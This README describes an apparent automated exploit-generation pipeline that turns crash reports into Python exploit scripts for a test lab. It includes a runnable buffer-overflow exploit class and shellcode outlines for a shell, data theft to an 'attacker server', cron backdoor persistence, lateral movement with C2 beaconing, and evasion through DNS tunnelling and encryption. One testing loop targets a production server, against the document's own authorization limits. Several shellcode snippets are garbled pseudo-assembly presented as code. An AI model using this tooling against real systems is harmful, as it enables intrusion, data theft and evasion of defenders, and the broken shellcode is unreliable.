# POC Exploit Code Rebuild Pipeline

## Overview

Het **POC Builder** systeem automatiseert het creëren van reproduceerbare exploit code uit crash analysemeldingen. Dit stelt je in staat om snel van crashgegevens naar testbare exploit code te gaan.

## Authorization Boundary

Gebruik deze pipeline uitsluitend onder [RoE-ITlusions-Testlab-2026](../ITL.Amalia/docs/engagements/RoE-ITlusions-Testlab-2026.md), geldig van 27 april 2026 t/m 31 december 2026. De operator is Niels Weistra, CISSP. De certificering is geen vervanging voor autorisatie: alleen expliciet in-scope testlabsystemen mogen worden gebruikt. Productiesystemen van klanten, niet-geautoriseerde cloud-tenants en systemen van derden zijn uitgesloten.

PoC-code blijft in de geïsoleerde labomgeving, gebruikt synthetische data en wordt niet tegen externe doelen uitgevoerd zonder een afzonderlijke schriftelijke RoE.

## Architecture

```
CRASH REPORT (JSON)
    ↓
[POCBuilder] Extract Context
    ↓ Context = {process, binary, signal, RIP, buffer_size, etc}
    ↓
[Classify] Exploit Type Detection
    ├─ BUFFER_OVERFLOW → Stack overflow template
    ├─ HEAP_OVERFLOW → Heap corruption template
    ├─ STACK_PIVOT → ROP chain template
    ├─ CODE_INJECTION → Memory write template
    └─ UNKNOWN → Generic template
    ↓
[Generate] POC Code from Template
    ├─ Fill vulnerable buffer
    ├─ Overwrite control flow (RIP/RBP)
    ├─ Trigger crash/code execution
    └─ Export as .py script
    ↓
[Test] Reproducibility Testing
    ├─ Run POC multiple times
    ├─ Measure success rate
    ├─ Verify reliability (>80%)
    └─ Export test results
    ↓
RELIABLE EXPLOIT (Python script)
```

## Workflow

### Fase 1: Load Crash Report

```python
from detection.crash_detection import CrashDetector

# Crash is detected by eBPF kernel program
crash_event = {
    "pid": 12345,
    "comm": "vulnerable_app",
    "signal": 11,  # SIGSEGV
    "rip": 0x7ffff7ab4000,  # Heap location
    "network_events": [...]  # Triggered remotely
}

# Process by detector
detector = CrashDetector()
crash = detector.process_crash_event(crash_event)

# Export as JSON report
crash_report_path = detector.export_crash_report(crash)
```

### Fase 2: Build POC from Report

```python
from examples.poc_builder import POCBuilder
import json

# Load crash analysis
with open(crash_report_path) as f:
    report = json.load(f)

# Initialize POC builder
builder = POCBuilder(report)

# Automatically classifies exploit type
print(builder.exploit_type)  # → ExploitType.BUFFER_OVERFLOW

# Generate POC code
exploit_code = builder.build_exploit()

# Export as executable Python script
poc_path = builder.export_poc("/tmp/exploit.py")
```

### Fase 3: Test Reproducibility

```python
# Test POC reliability
results = builder.test_poc(poc_path, iterations=10)

print(results)
# {
#   "total_runs": 10,
#   "successful": 9,
#   "failed": 1,
#   "success_rate": 0.9,
#   "reliable": true
# }

if results["reliable"]:
    print("[+] Exploit is production-ready")
else:
    print("[-] Needs tuning or more analysis")
```

### Fase 4: Run Full Pipeline

```python
from examples.poc_builder import rebuild_poc_from_crash

# One-liner rebuild: load → build → test → export
poc_path = rebuild_poc_from_crash(
    crash_report_path="/tmp/crash_report.json",
    output_dir="/tmp/exploits"
)

# Files generated:
# - /tmp/exploits/exploit_buffer_overflow.py  (POC)
# - /tmp/exploits/poc_test_results.json       (Test results)
```

## Exploit Type Detection

### Buffer Overflow (Stack)

**Indicators:**
- Signal: SIGSEGV (11)
- RIP Location: STACK
- Pattern: A's, B's, C's in registers (controlled pattern)
- Syscalls: recv() followed by crash

**Template Features:**
- Fill buffer with controlled pattern
- Overwrite RIP (return address)
- Verify crash on return
- Can chain with ROP gadgets

**Generated Code:**
```python
buffer = b"A" * (buffer_size - 8)
rip_target = 0x41414141  # Invalid address
buffer += struct.pack("<Q", rip_target)
```

### Heap Overflow

**Indicators:**
- Signal: SIGABRT (6) or SIGSEGV (11)
- RIP Location: HEAP
- Pattern: Malloc chunk corruption
- Syscalls: malloc() then corruption detected

**Template Features:**
- Target heap chunk metadata
- Overwrite size/flags fields
- Trigger heap consolidation
- Achieve arbitrary write

**Generated Code:**
```python
fake_size = struct.pack("<Q", 0x101)
fake_prev_size = struct.pack("<Q", 0x100)
# Next chunk free() will corrupt heap
```

### Stack Pivot + ROP

**Indicators:**
- Multiple gadgets required
- RIP points to ROP chain
- Complex syscall sequence

**Template Features:**
- Identify ROP gadgets (pop/mov/syscall)
- Chain gadgets together
- Set up syscall arguments
- Trigger system call

**Generated Code:**
```python
chain = struct.pack("<Q", gadget_pop_rdi)
chain += struct.pack("<Q", 0x7ffff7ab4000)  # /bin/sh
chain += struct.pack("<Q", gadget_syscall)
```

### Code Injection

**Indicators:**
- Direct memory write
- Code execution from data segment
- JIT compilation involved

**Template Features:**
- Write shellcode to memory
- mprotect to make executable
- Redirect execution flow

## Payload Stages

```
STAGE 1: TRIGGER (Send initial payload)
├─ Socket connect to vulnerable service
├─ Send crafted input to reach vulnerable function
└─ Wait for crash/effect

STAGE 2: SETUP (Prepare execution environment)
├─ If needed: mmap() to allocate memory
├─ If needed: mprotect() to change permissions
└─ If needed: Load ROP gadgets

STAGE 3: DELIVERY (Send exploitation payload)
├─ Send controlled buffer
├─ Overwrite return address/heap metadata
├─ Trigger memory corruption
└─ Direct execution flow

STAGE 4: VERIFY (Confirm success)
├─ Check if process crashed
├─ Check if command executed
├─ Check for callbacks/beacon
└─ Report success/failure
```

## Payload Variations

For different goals, vary the final stage:

### 1. Crash Verification (Proof of Concept)
```python
# Goal: Confirm exploitability
rip_target = 0x41414141  # Invalid address
# Process will crash → proves control over RIP
```

### 2. Reverse Shell
```python
# Goal: Get interactive shell
shellcode = asm("""
    mov rax, 59        # execve syscall
    mov rdi, /bin/sh   # First arg
    mov rsi, 0         # NULL
    syscall
""")
```

### 3. Data Exfiltration
```python
# Goal: Steal sensitive data
shellcode = asm("""
    open("/etc/passwd")
    read() to attacker server
    close()
""")
```

### 4. Persistence
```python
# Goal: Maintain long-term access
shellcode = asm("""
    write("* * * * * /backdoor" >> /crontab)
    or
    chmod +s /backdoor
""")
```

### 5. Lateral Movement
```python
# Goal: Attack other systems
shellcode = asm("""
    Scan network
    Exploit other targets
    Beacon to C2
""")
```

## Testing Strategy

### Reproducibility Testing

```python
results = builder.test_poc(poc_path, iterations=20)

# Target: 100% success on same target
# Acceptable: ≥80% success (indicates reliability)
# Minimum: <50% success (needs debugging)

BENCHMARK:
- Buffer overflow: Usually 95%+ (deterministic)
- Heap overflow: Usually 70-90% (depends on heap state)
- ROP chains: Usually 60-80% (ASLR complications)
- Generic crashes: Usually 40-60% (unstable)
```

### Variation Testing

```python
# Test different payload sizes
for size in [256, 512, 1024, 2048]:
    payload = create_payload(size)
    results = run_exploit(payload)
    print(f"Size {size}: {results['success_rate']}%")

# Test different target ports
for port in [8888, 9999, 10000]:
    exploit.target_port = port
    results = exploit.run()
```

### Target Variation Testing

```python
# Test on different target systems
targets = [
    "localhost",
    "192.168.1.100",  # Staging server
    "prod-server",    # Production
]

for target in targets:
    exploit.target_ip = target
    results = exploit.run(iterations=5)
    # Verify consistency across platforms
```

## Advanced Techniques

### Fuzzing Payload Parameters

```python
def fuzz_buffer_size(min_size, max_size, step=16):
    """Find exact buffer size needed"""
    results = []
    
    for size in range(min_size, max_size, step):
        payload = create_payload(size)
        success = send_payload(payload)
        results.append({"size": size, "success": success})
    
    return results
```

### Coredump Analysis Integration

```python
# If coredump available, analyze with GDB
if crash.coredump_path:
    # Extract exact register values
    gdb_output = subprocess.run(
        ["gdb", binary, coredump, "-ex", "info registers"]
    )
    
    # Parse RIP value for more accurate ROP chain
    # Parse RSP/RBP for stack pivot calculation
```

### Anti-Evasion Techniques

```python
# Add timing delays to evade detection
time.sleep(random.uniform(0.5, 2.0))

# Vary payload signature
payload = generate_payload()
payload = encrypt(payload)  # Encrypt traffic

# Use DNS tunnel instead of direct connection
tunnel = DNSClient()
tunnel.send(payload)
```

## Generated POC Structure

```python
#!/usr/bin/env python3
"""
Auto-generated Exploit Code

Crash Analysis Context:
- Binary: /path/to/binary
- Signal: SIGSEGV (11)
- RIP Location: HEAP
- Buffer Size: 1024 bytes
- Exploit Type: buffer_overflow
"""

import socket
import struct
import subprocess
import time


class BufferOverflowExploit:
    """Auto-generated exploit class"""
    
    def __init__(self, target_ip="localhost", target_port=8888):
        self.target_ip = target_ip
        self.target_port = target_port
        self.buffer_size = 1024
    
    def create_payload(self, payload_type="crash"):
        """Build payload
        
        Args:
            payload_type: "crash" (verify), "shell" (ROP), etc.
        """
        buffer = b"A" * (self.buffer_size - 8)
        
        if payload_type == "crash":
            rip_target = 0x41414141
        else:
            rip_target = 0x7ffff7ab4000
        
        buffer += struct.pack("<Q", rip_target)
        return buffer
    
    def send_payload(self, payload):
        """Send to target"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_ip, self.target_port))
        sock.sendall(payload)
        sock.close()
    
    def verify_crash(self):
        """Check if crashed"""
        time.sleep(0.5)
        result = subprocess.run(
            ["pgrep", "-x", "vulnerable_app"],
            capture_output=True
        )
        return result.returncode != 0
    
    def run(self, iterations=10):
        """Execute exploit"""
        successful = 0
        for i in range(iterations):
            payload = self.create_payload()
            self.send_payload(payload)
            if self.verify_crash():
                successful += 1
        return successful / iterations


if __name__ == "__main__":
    exploit = BufferOverflowExploit()
    success_rate = exploit.run(iterations=10)
    print(f"Success rate: {success_rate*100:.1f}%")
```

## Workflow Integration

### With BrainCell

```python
# Stream crash detection and POC building to BrainCell
from integrations.braincell import BrainCellClient

client = BrainCellClient()

# Send crash alert
client.send_event({
    "type": "crash_alert",
    "risk_level": "HIGH",
    "process": "vulnerable_app",
})

# Send generated POC
client.send_event({
    "type": "poc_generated",
    "exploit_type": "buffer_overflow",
    "success_rate": 0.9,
})
```

### With Amalia

```python
# Export POC analysis to Amalia threat platform
from integrations.amalia import AmaliaExporter

exporter = AmaliaExporter()
exporter.export_poc_analysis({
    "crash_report": crash_report,
    "poc_path": poc_path,
    "exploit_type": exploit_type,
    "success_rate": 0.9,
    "reliability": "HIGH",
})
```

## Performance

**Typical Timings:**

| Operation | Time |
|-----------|------|
| Load crash report | 10ms |
| Extract context | 5ms |
| Classify exploit type | 5ms |
| Generate POC code | 50ms |
| Export to file | 5ms |
| Test (10 iterations) | 5-10 seconds |
| **Total end-to-end** | **< 15 seconds** |

**Scalability:**

- **Single crash analysis:** < 1 second
- **10 parallel POC builders:** < 5 seconds
- **100 crash reports:** < 30 seconds

## Troubleshooting

### POC Not Crashing Target

```bash
# 1. Verify target is running
pgrep vulnerable_app

# 2. Check network connectivity
nc -zv localhost 8888

# 3. Adjust buffer size
# Edit poc_path and modify buffer_size parameter

# 4. Add debug output
python3 exploit.py --debug

# 5. Capture network traffic
tcpdump -i any -nn -w capture.pcap port 8888
wireshark capture.pcap
```

### Low Success Rate (<70%)

```bash
# Possible causes:
# 1. ASLR enabled (randomizes addresses)
#    → Add ASLR detection and gadget re-scanning

# 2. Target process state varies
#    → Add heap/stack warmup phase

# 3. Timing issues
#    → Add dynamic delays between stages

# 4. Address space differs
#    → Extract actual addresses from coredump
```

### Import Errors

```bash
# Ensure detection modules are importable
export PYTHONPATH=/path/to/userspace/src:$PYTHONPATH

# Run from correct directory
cd /path/to/userspace/src
python3 examples/poc_rebuild_demo.py
```

## Security Considerations

- **Contained Testing:** Always test in isolated environment
- **Artifact Cleanup:** Remove POC after testing
- **Logging:** Document all test results for audit trail
- **Access Control:** Restrict POC distribution
- **Responsible Disclosure:** Notify vendor before release

## Examples

### Quick Start

```bash
cd d:\repos\ITL.Amalia.Poc.eBpf\userspace\src

# Run complete demo
python examples/poc_rebuild_demo.py

# Output:
# [+] Crash detected: vulnerable_app
# [+] Crash report exported
# [+] POC generated: buffer_overflow
# [+] Success rate: 90%
# [+] Files: exploit.py, analysis_summary.json
```

### Programmatic Usage

```python
from examples.poc_builder import rebuild_poc_from_crash

# Build POC from crash report
poc_path = rebuild_poc_from_crash(
    crash_report_path="/tmp/crash_report.json",
    output_dir="/tmp/exploits"
)

# POC is now ready to test
subprocess.run(["python3", poc_path])
```

## Next Steps

1. ✅ Crash detection → CrashDetector class
2. ✅ POC generation → POCBuilder class
3. ✅ Testing framework → test_poc() method
4. ⏳ Integrate with eBPF kernel hooks
5. ⏳ Add GDB integration for coredump analysis
6. ⏳ Implement anti-detection variations
7. ⏳ Deploy to production crash monitoring

---

**Document Version:** 1.0  
**Last Updated:** 2026-10-01
